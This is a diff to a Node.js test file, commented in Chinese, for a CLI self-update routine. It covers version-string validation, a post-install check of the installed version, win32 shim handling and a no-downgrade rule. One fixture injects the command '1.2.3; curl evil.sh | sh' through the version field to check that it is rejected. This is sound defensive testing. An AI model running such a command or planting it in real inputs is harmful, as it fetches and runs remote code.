@@ -6,13 +6,15 @@
  * （正常退出 / ENOENT / 超时 SIGTERM）用真实短命 node 子进程直测。
  *
  * 覆盖：安装形态两道闸（dev-link / unsupported-layout）、版本预检（registry ok
- * → mirror 兜底 → 双败 no-target）、up-to-date 短路、候选链顺序与 ENOENT 换路
- * （pnpm-missing 出路文案）、cwd=profileDir、精确版本安装（无 @latest）、
- * profile-missing、超时 / 非零退出、成功流 from/to/restartRequired、win32
- * shell 分支、in-flight 去重，全局 CLI 顺带更新（方案 B：missing 零 spawn /
- * 旧版跟更 npm i -g 契约 / same 跳过 / up-to-date 仍跟更 / npm 全落空与非零
- * 退出不拖累整体 / profile 内 bin 不认作全局），以及 index.mjs 路由接线
- * （仓库检出形态下 200 + ok:false 收敛，不真装、不发外网请求）。
+ * → mirror 兜底 → 双败 no-target）、M1 版本形状闸（元字符拒绝 / 预发布放行）、
+ * up-to-date 短路、候选链顺序与 ENOENT 换路（pnpm-missing 出路文案）、cwd=
+ * profileDir、精确版本安装（无 @latest）、profile-missing、超时 / 非零退出、
+ * M2 装后对账（profile 与全局的 verify-failed）、成功流 from/to/restartRequired、
+ * win32 shell 分支、in-flight 去重，全局 CLI 顺带更新（方案 B：missing 零 spawn /
+ * 旧版跟更 npm i -g 契约 / 同版与 L5 更新不降级跳过 / up-to-date 仍跟更 / npm
+ * 全落空与非零退出不拖累整体 / profile 内 bin 不认作全局 / M3 win32 .cmd shim
+ * 定位 prefix），以及 index.mjs 路由接线（仓库检出形态下 200 + ok:false 收敛，
+ * 不真装、不发外网请求）。
  */
 
 import test from 'node:test'
@@ -87,6 +89,19 @@ function noHomebrewOpt() {
   return () => { throw err }
 }
 
+/** 装后对账（M2）读的安装位：profileDir/node_modules/dsh-maoying/package.json。 */
+const INSTALLED_PKG = path.join(PROFILE_DIR, 'node_modules', 'dsh-maoying', 'package.json')
+
+/** readImpl 常用形：安装位 package.json 返回指定版本（模拟 pnpm 装完的磁盘状态），其余路径 ENOENT。 */
+function installedPkg(version) {
+  return (p) => {
+    if (p === INSTALLED_PKG) return JSON.stringify({ name: 'dsh-maoying', version })
+    const err = new Error('ENOENT: no fake installed package.json')
+    err.code = 'ENOENT'
+    throw err
+  }
+}
+
 /** 常用依赖组合：真路径即布局路径（正常目录安装形态），第三路候选成功。 */
 function layoutDeps(overrides = {}) {
   return {
@@ -96,6 +111,7 @@ function layoutDeps(overrides = {}) {
     realpathImpl: (p) => p, // 透传 = 真路径与常规路径一致（非 symlink）
     existsImpl: existsFor(['/opt/homebrew/bin/corepack']),
     readdirImpl: noHomebrewOpt(),
+    readImpl: installedPkg('1.2.3'), // M2 装后对账：默认 npm 桩的 target 也是 1.2.3，对账通过
     fetchImpl: npmStub(),
     platform: 'darwin',
     execPath: '/usr/local/bin/node',
@@ -121,10 +137,12 @@ const GLOBAL_ROOT = '/fake-global/lib/node_modules/dsh-maoying'
  *   - extraPathDirs：追加到 PATH 最前的目录（候选按序先撞上它们）。
  *   - extraPkgs：追加的包根 → package.json manifest（profile 内包根假件）。
  */
-function withGlobalCli(deps, { globalVersion = '0.9.0', binRealpath = path.join(GLOBAL_ROOT, 'bin', 'maoying.mjs'), extraBins = [], extraPathDirs = [], extraPkgs = {} } = {}) {
+function withGlobalCli(deps, { globalVersion = '0.9.0', binRealpath = path.join(GLOBAL_ROOT, 'bin', 'maoying.mjs'), extraBins = [], extraPathDirs = [], extraPkgs = {}, stuckAfterInstall = false } = {}) {
   const pkgs = { [GLOBAL_ROOT]: { name: 'dsh-maoying', version: globalVersion }, ...extraPkgs }
   const baseExists = deps.existsImpl
   const baseRealpath = deps.realpathImpl
+  const baseRead = deps.readImpl
+  const baseSpawn = deps.spawnImpl
   const bins = [[GLOBAL_BIN, binRealpath], ...extraBins]
   return {
     ...deps,
@@ -138,10 +156,26 @@ function withGlobalCli(deps, { globalVersion = '0.9.0', binRealpath = path.join(
       for (const [dir, manifest] of Object.entries(pkgs)) {
         if (p === path.join(dir, 'package.json')) return JSON.stringify(manifest)
       }
-      const err = new Error('ENOENT: no fake package.json')
-      err.code = 'ENOENT'
-      throw err
+      return baseRead(p) // 其余路径回退基础假件（M2 装后对账要读的 profile 内 package.json）
     },
+    spawnImpl: (command, args, opts, timeoutMs, timeoutLabel) =>
+      Promise.resolve(baseSpawn(command, args, opts, timeoutMs, timeoutLabel)).then((r) => {
+        // 模拟磁盘被 npm 真的更新：全局 npm i -g 退出码 0 后把假包根的 version
+        // 换成安装参数里的精确目标，供 M2 装后对账回读。stuckAfterInstall
+        // 时不换，钉死「npm 自称成功但磁盘没变」的对账失败形态。
+        if (
+          !stuckAfterInstall
+          && r?.code === 0
+          && args?.[0] === 'i' && args?.[1] === '-g'
+          && typeof args?.[2] === 'string' && args[2].startsWith('dsh-maoying@')
+        ) {
+          const installed = args[2].slice('dsh-maoying@'.length)
+          for (const [dir, manifest] of Object.entries(pkgs)) {
+            if (path.join(dir, 'package.json') !== INSTALLED_PKG) pkgs[dir] = { ...manifest, version: installed }
+          }
+        }
+        return r
+      }),
   }
 }
 
@@ -208,7 +242,7 @@ test('版本预检：registry 失败回落 npmmirror 镜像', async () => {
   resetSelfUpdateInflight()
   const fetch = npmStub({ registry: { ok: false }, mirror: { ok: true, version: '2.0.0' } })
   const spawn = spawnScripter([{ code: 0, output: 'ok' }])
-  const r = await selfUpdate(layoutDeps({ fetchImpl: fetch, spawnImpl: spawn, existsImpl: existsFor() }))
+  const r = await selfUpdate(layoutDeps({ fetchImpl: fetch, spawnImpl: spawn, existsImpl: existsFor(), readImpl: installedPkg('2.0.0') }))
   assert.equal(r.ok, true)
   assert.deepEqual(fetch.calls, ['registry', 'mirror'], '先 registry 后 mirror')
   assert.ok(spawn.calls[0].args.includes('dsh-maoying@2.0.0'), '镜像拿到的目标版本照装')
@@ -447,12 +481,142 @@ test('bin 候选落在 profile 目录内：不认作全局，跳过该候选继�
   const r = await selfUpdate(withGlobalCli(layoutDeps({ spawnImpl: spawn }), {
     extraBins: [[profileBin, path.join(LAYOUT_DIR, 'bin', 'maoying.mjs')]], // realpath 上溯 = profile 自己的包
     extraPathDirs: [path.dirname(profileBin)], // 排在真全局 bin 之前，必先撞上
-    extraPkgs: { [LAYOUT_DIR]: { name: 'dsh-maoying', version: CURRENT } }, // name 对、路径在 profile 内
+    extraPkgs: { [LAYOUT_DIR]: { name: 'dsh-maoying', version: '1.2.3' } }, // name 对、路径在 profile 内；version 与对账目标一致（M2 也读这份）
   }))
   assert.equal(r.ok, true)
   assert.deepEqual(r.globalCli, { ok: true, from: '0.9.0', to: '1.2.3' }, 'profile 内 bin 被排除，认的是 PATH 里更后面的真全局')
   const g = spawn.calls[3]
   assert.deepEqual(g.args, ['i', '-g', 'dsh-maoying@1.2.3'], '确实按旧版全局（0.9.0）发起更新，而非 profile 内那份')
+})
+
+// ── M1：版本形状闸（防被控源把元字符拼进 spawn 参数）─────────────────────────
+
+test('M1：registry 返回携带元字符的 version → no-target 拒绝，绝不 spawn', async () => {
+  resetSelfUpdateInflight()
+  const spawn = spawnScripter([])
+  const fetch = npmStub({ registry: { ok: true, version: '1.2.3; curl evil.sh | sh' } })
+  const r = await selfUpdate(layoutDeps({ fetchImpl: fetch, spawnImpl: spawn }))
+  assert.equal(r.ok, false)
+  assert.equal(r.kind, 'no-target', '非法版本串按 no-target 收敛')
+  assert.match(r.message, /非法/, '文案说明版本串非法')
+  assert.equal(spawn.calls.length, 0, '元字符绝不进 spawn 参数')
+})
+
+test('M1：self-update 使用点二次闸——穿透源校验的串在拼参前仍被拒', async () => {
+  // version.mjs 源头只剥一层 v 即放行（latest 变 'vv1.2.3'），self-update 拼
+  // `dsh-maoying@${targetVersion}` 前再剥一层得 'v1.2.3' 不合形状 → 二次闸
+  // 拒绝，证明两层校验各自在岗。
+  resetSelfUpdateInflight()
+  const spawn = spawnScripter([])
+  const fetch = npmStub({ registry: { ok: true, version: 'v1.2.3' } })
+  const r = await selfUpdate(layoutDeps({ fetchImpl: fetch, spawnImpl: spawn, existsImpl: existsFor() }))
+  assert.equal(r.ok, false)
+  assert.equal(r.kind, 'no-target')
+  assert.match(r.message, /非法/)
+  assert.equal(spawn.calls.length, 0)
+})
+
+test('M1：合法预发布 version 放行，按精确预发布版本安装', async () => {
+  resetSelfUpdateInflight()
+  const spawn = spawnScripter([{ code: 0, output: 'ok' }])
+  const r = await selfUpdate(layoutDeps({
+    fetchImpl: npmStub({ registry: { ok: true, version: '1.2.3-rc.1' } }),
+    spawnImpl: spawn,
+    readImpl: installedPkg('1.2.3-rc.1'),
+  }))
+  assert.equal(r.ok, true)
+  assert.equal(r.to, '1.2.3-rc.1')
+  assert.ok(spawn.calls[0].args.includes('dsh-maoying@1.2.3-rc.1'), '预发布段原样进安装参数')
+})
+
+// ── M2：装后磁盘对账 ─────────────────────────────────────────────────────────
+
+test('M2：装后磁盘 version 与目标不符 → verify-failed + 手动重装指引，不碰全局', async () => {
+  resetSelfUpdateInflight()
+  const spawn = spawnScripter([ENOENT_RESULT, ENOENT_RESULT, { code: 0, output: 'added 1 package' }])
+  const r = await selfUpdate(layoutDeps({
+    spawnImpl: spawn,
+    readImpl: installedPkg('0.9.9'), // pnpm 退出码 0，但磁盘上是旧版本（半装/坏包形态）
+  }))
+  assert.equal(r.ok, false)
+  assert.equal(r.kind, 'verify-failed', '新 kind 走既有 ok:false 分支（client 透传兼容）')
+  assert.match(r.message, /0\.9\.9/, 'message 带磁盘实际版本')
+  assert.match(r.message, new RegExp('pnpm add dsh-maoying@1\\.2\\.3'), 'message 带手动重装指引')
+  assert.equal(r.globalCli, undefined, 'verify-failed 与其他 profile 失败路径同收敛，不跑全局阶段')
+  assert.equal(spawn.calls.length, 3, '只有 profile 三路候选，无全局 spawn')
+})
+
+test('M2：装后读不到安装位 package.json → verify-failed', async () => {
+  resetSelfUpdateInflight()
+  const r = await selfUpdate(layoutDeps({
+    readImpl: () => { const e = new Error('ENOENT'); e.code = 'ENOENT'; throw e },
+  }))
+  assert.equal(r.ok, false)
+  assert.equal(r.kind, 'verify-failed')
+  assert.match(r.message, /读不到/, '文案区分「读不到」形态')
+  assert.match(r.message, new RegExp('pnpm add dsh-maoying@1\\.2\\.3'))
+})
+
+test('M2：全局 npm i -g 退出码 0 但磁盘 version 未变 → globalCli verify-failed + 手动出路', async () => {
+  resetSelfUpdateInflight()
+  const spawn = spawnScripter([
+    ENOENT_RESULT, ENOENT_RESULT, { code: 0, output: 'added 1 package' }, // profile 成功
+    { code: 0, output: 'changed 1 package' }, // 全局 npm 自称成功
+  ])
+  const r = await selfUpdate(withGlobalCli(layoutDeps({ spawnImpl: spawn }), {
+    globalVersion: '0.9.0',
+    stuckAfterInstall: true, // 装后磁盘假件不变 → 模拟 npm 谎报成功
+  }))
+  assert.equal(r.ok, true, '整体仍 ok（profile 已装好，全局失败不追责整单）')
+  assert.equal(r.restartRequired, true)
+  assert.equal(r.globalCli.ok, false)
+  assert.equal(r.globalCli.kind, 'verify-failed')
+  assert.match(r.globalCli.error, /对账失败/)
+  assert.match(r.globalCli.error, new RegExp('npm i -g dsh-maoying@1\\.2\\.3'), 'error 带手动重装出路')
+})
+
+// ── M3：win32 .cmd shim 的全局 prefix 定位 ───────────────────────────────────
+
+test('M3：win32 .cmd shim——prefix 取 dirname(命令路径)，不再恒 skipped:missing', async () => {
+  resetSelfUpdateInflight()
+  // 夹具统一用 host path 模块拼接（测试宿主为 posix）；win32 形状由注入的
+  // platform + .cmd 后缀体现。
+  const WIN_PREFIX = '/fake-win/npm'
+  const winBin = path.join(WIN_PREFIX, 'maoying.cmd')
+  const winRoot = path.join(WIN_PREFIX, 'node_modules', 'dsh-maoying')
+  const spawn = spawnScripter([
+    ENOENT_RESULT, ENOENT_RESULT, { code: 0, output: 'added 1 package' }, // profile：pnpm.cmd → corepack.cmd → homebrew corepack.cmd
+    { code: 0, output: 'changed 1 package' }, // 全局：裸 npm.cmd 命中
+  ])
+  const r = await selfUpdate(withGlobalCli(layoutDeps({
+    platform: 'win32',
+    spawnImpl: spawn,
+    // buildCandidates 的 homebrew 绝对候选写死无 .cmd 后缀（win32 上不存在
+    // homebrew，无碍），第三路用 execPath 同目录的 .cmd 候选（带后缀）。
+    existsImpl: existsFor(['/usr/local/bin/corepack.cmd']),
+  }), {
+    globalVersion: '0.0.1', // 假 darwin 式全局根给个无关版本，from 是 0.9.0 即证明走的是 win shim 路径
+    extraBins: [[winBin, winBin]], // .cmd shim 是普通文件，realpath 原样返回
+    extraPathDirs: [WIN_PREFIX],
+    extraPkgs: { [winRoot]: { name: 'dsh-maoying', version: '0.9.0' } },
+  }))
+  assert.equal(r.ok, true)
+  assert.deepEqual(r.globalCli, { ok: true, from: '0.9.0', to: '1.2.3' }, '按 <prefix>/node_modules/dsh-maoying 定位成功，而非 skipped:missing')
+  const g = spawn.calls[3]
+  assert.equal(g.command, 'npm.cmd')
+  assert.deepEqual(g.args, ['i', '-g', 'dsh-maoying@1.2.3'])
+  assert.equal(g.opts.shell, true, 'win32 npm shim 经 shell 拉起')
+})
+
+// ── L5：全局不降级 ───────────────────────────────────────────────────────────
+
+test('L5：全局 version 比目标更新 → skipped:same 不降级，不 spawn npm', async () => {
+  resetSelfUpdateInflight()
+  const spawn = spawnScripter([ENOENT_RESULT, ENOENT_RESULT, { code: 0, output: 'added 1 package' }])
+  const r = await selfUpdate(withGlobalCli(layoutDeps({ spawnImpl: spawn }), { globalVersion: '9.9.9' }))
+  assert.equal(r.ok, true)
+  assert.deepEqual(r.globalCli, { ok: true, skipped: 'same', version: '9.9.9' }, '不落后即跳过，绝不 npm i -g 静默降级')
+  assert.equal(spawn.calls.length, 3, '全局阶段零 spawn')
 })
 
 // ── defaultSpawn（真实短命子进程，直测缺省执行器契约）────────────────────────
@@ -488,6 +652,22 @@ test('defaultSpawn：超时 SIGTERM kill，收敛 errorCode ETIMEDOUT', async ()
     '测试',
   )
   assert.equal(r.errorCode, 'ETIMEDOUT', '超时进程被 kill 且结构化收敛')
+  assert.match(r.error, /超时/)
+})
+
+test('defaultSpawn：win32 树杀分支——taskkill 不可用时退回 SIGKILL，仍收敛 ETIMEDOUT', async () => {
+  // 宿主（darwin）无 taskkill：注入 platform=win32 走 taskkill 分支，killer
+  // spawn 出 ENOENT → error → 兜底 SIGKILL 杀掉进程，断言超时收敛契约不被
+  // 分支改动破坏（真实 /T /F 树杀仅在 win32 实机生效）。
+  const r = await defaultSpawn(
+    process.execPath,
+    ['-e', 'setInterval(() => {}, 1000)'],
+    { stdio: ['ignore', 'pipe', 'pipe'] },
+    150,
+    '测试',
+    'win32',
+  )
+  assert.equal(r.errorCode, 'ETIMEDOUT')
   assert.match(r.error, /超时/)
 })
 
